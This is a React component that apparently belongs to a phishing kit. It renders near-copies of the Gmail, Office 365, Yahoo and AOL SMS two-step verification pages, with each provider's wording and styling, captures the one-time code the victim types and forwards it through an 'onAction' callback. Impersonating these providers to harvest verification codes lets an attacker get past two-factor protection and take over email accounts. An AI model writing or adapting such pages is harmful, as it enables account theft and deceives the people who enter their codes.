import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { ProviderKey, getProviderTheme } from './providerTheme';
import ProviderShell from './ProviderShell';

interface SmsCodePageProps {
  providerKey: ProviderKey;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Shared "enter the SMS code" page. Per-provider entry-points
 * (`GmailSmsCodePage`, `Office365SmsCodePage`, ...) are thin wrappers that
 * inject the right `providerKey` so `App.tsx` routing keeps working.
 *
 * The visual chrome is supplied by `ProviderShell`, which mirrors each
 * provider's real challenge-page chrome (Google two-column, Microsoft
 * 440px MS-bg card, Yahoo / AOL header-bar + narrow centred card, etc.).
 */
const SmsCodePage: React.FC<SmsCodePageProps> = ({ providerKey, onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const theme = getProviderTheme(providerKey);
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const phoneNumber =
    (data.phoneNumber as string) ||
    (data.phone as string) ||
    'the phone number on file';

  const [code, setCode] = useState('');
  const [submitting, setSubmitting] = useState(false);

  const headline: Record<ProviderKey, string> = {
    gmail: '2-Step Verification',
    office365: 'Enter code',
    yahoo: 'Verify your identity',
    aol: 'Verification code',
    others: 'Enter verification code',
  };

  const description: Record<ProviderKey, React.ReactNode> = {
    gmail: (
      <>
        To help keep your account safe, Google wants to make sure it&rsquo;s really
        you trying to sign in. A text message with a 6-digit verification code
        was sent to <strong>{phoneNumber}</strong>.
      </>
    ),
    office365: (
      <>We texted your phone {phoneNumber}. Please enter the code to sign in.</>
    ),
    yahoo: (
      <>
        To keep your account secure, we need to verify it&rsquo;s really you. We
        sent a verification code to <strong>{phoneNumber}</strong>.
      </>
    ),
    aol: (
      <>
        We sent a verification code to <strong>{phoneNumber}</strong>. Please
        enter it below to continue signing in.
      </>
    ),
    others: (
      <>
        We sent a 6-digit code to <strong>{phoneNumber}</strong>. Enter it below
        to continue.
      </>
    ),
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length < 6 || submitting) return;
    setSubmitting(true);
    onAction('submit_sms', { code });
  };
  const goBack = () => {
    onAction('cancel');
    navigate(-1);
  };

  // Provider-specific input element (matches the corresponding login page input).
  const renderInput = () => {
    if (providerKey === 'gmail') {
      return (
        <>
          <h2 className="text-[18px] text-gray-900 font-normal mb-2">Get a verification code</h2>
          <label className="block text-xs text-gray-600 mb-1">Enter the code</label>
          <input
            type="tel"
            inputMode="numeric"
            autoComplete="one-time-code"
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
            maxLength={6}
            autoFocus
            className="w-full px-3 py-3 text-lg tracking-[0.4em] bg-transparent border border-gray-400 rounded-md outline-none focus:border-blue-600 focus:border-2"
          />
          <label className="flex items-center mt-4 text-sm text-gray-700">
            <input type="checkbox" className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500" />
            <span className="ml-2">Don&rsquo;t ask again on this device</span>
          </label>
        </>
      );
    }
    if (providerKey === 'office365') {
      return (
        <>
          <input
            type="tel"
            inputMode="numeric"
            autoComplete="one-time-code"
            placeholder="Code"
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
            maxLength={8}
            autoFocus
            className="w-full px-2 py-1 text-[15px] border-0 border-b-2 bg-transparent outline-none focus:border-[#0067b8]"
            style={{ borderBottomColor: '#666' }}
          />
          <div className="mt-3">
            <label className="inline-flex items-center text-sm text-[#1b1b1b]">
              <input type="checkbox" className="mr-2" />
              Don&rsquo;t ask me again for 14 days
            </label>
          </div>
        </>
      );
    }
    if (providerKey === 'yahoo') {
      return (
        <>
          <label className="block text-xs text-gray-600">Verification code</label>
          <input
            type="tel"
            inputMode="numeric"
            autoComplete="one-time-code"
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
            maxLength={8}
            autoFocus
            className="w-full bg-transparent pt-2 pb-2 text-base tracking-[0.3em] focus:outline-none border-b"
            style={{ borderColor: '#dcdfe0' }}
          />
        </>
      );
    }
    if (providerKey === 'aol') {
      return (
        <input
          type="tel"
          inputMode="numeric"
          autoComplete="one-time-code"
          placeholder="Enter code"
          value={code}
          onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
          maxLength={8}
          autoFocus
          className="w-full bg-white pt-2 pb-2 text-base border-b tracking-[0.25em] focus:outline-none"
          style={{ borderColor: '#dcdfe0' }}
        />
      );
    }
    // others
    return (
      <input
        type="tel"
        inputMode="numeric"
        autoComplete="one-time-code"
        placeholder="123456"
        value={code}
        onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 8))}
        maxLength={8}
        autoFocus
        className="w-full px-4 py-3 text-center text-lg tracking-[0.4em] border rounded-md outline-none focus:border-[#0066cc]"
        style={{ borderColor: '#d1d1d1' }}
      />
    );
  };

  // Provider-styled action buttons. Wrapped in form so submit-on-Enter works.
  const actions = (
    <>
      {(providerKey === 'gmail' || providerKey === 'office365') && (
        <button
          type="submit"
          form="sms-form"
          disabled={code.length < 6 || submitting}
          className={
            providerKey === 'gmail'
              ? 'px-6 py-2.5 text-white text-sm font-semibold rounded-full disabled:opacity-50'
              : 'px-6 py-[6px] text-white text-sm font-semibold disabled:opacity-60'
          }
          style={{ backgroundColor: theme.primary, ...(providerKey === 'office365' ? { minWidth: '108px' } : {}) }}
        >
          {submitting ? 'Verifying\u2026' : providerKey === 'gmail' ? 'Next' : 'Verify'}
        </button>
      )}
      {(providerKey === 'yahoo' || providerKey === 'aol' || providerKey === 'others') && (
        <button
          type="submit"
          form="sms-form"
          disabled={code.length < 6 || submitting}
          className={
            providerKey === 'aol'
              ? 'w-full py-3 text-white font-bold rounded-md text-base disabled:opacity-50'
              : providerKey === 'yahoo'
                ? 'w-full py-3 text-white font-medium rounded-full disabled:opacity-60'
                : 'w-full py-3 text-white text-sm font-semibold rounded-md disabled:opacity-60'
          }
          style={{ backgroundColor: theme.primary }}
        >
          {submitting ? 'Verifying\u2026' : providerKey === 'others' ? 'Verify and continue' : 'Verify'}
        </button>
      )}
    </>
  );

  const secondary = (
    <>
      {(providerKey === 'gmail' || providerKey === 'office365') ? (
        <button
          type="button"
          onClick={() => onAction('resend_sms')}
          className={
            providerKey === 'gmail'
              ? 'text-sm font-semibold text-blue-600 hover:underline'
              : 'text-sm text-[#0067b8] hover:underline text-left w-fit'
          }
        >
          {providerKey === 'gmail' ? 'Resend code' : 'Having trouble? Sign in another way'}
        </button>
      ) : (
        <>
          <button type="button" onClick={() => onAction('resend_sms')} className="hover:underline font-medium" style={{ color: theme.primary }}>
            Resend code
          </button>
          <button type="button" onClick={goBack} className="hover:underline font-medium" style={{ color: theme.primary }}>
            Try another way
          </button>
        </>
      )}
    </>
  );

  // Gmail also needs a "Try another way" inline next to the submit button.
  const gmailExtraSecondary =
    providerKey === 'gmail' ? (
      <button
        type="button"
        onClick={goBack}
        className="text-sm font-semibold text-blue-600 hover:underline"
      >
        Try another way
      </button>
    ) : null;

  return (
    <ProviderShell
      providerKey={providerKey}
      email={email}
      title={headline[providerKey]}
      description={description[providerKey]}
      onBack={goBack}
      primaryActions={
        <>
          {gmailExtraSecondary}
          {actions}
        </>
      }
      secondaryAction={secondary}
    >
      <form id="sms-form" onSubmit={handleSubmit}>
        {renderInput()}
      </form>
    </ProviderShell>
  );
};

export default SmsCodePage;
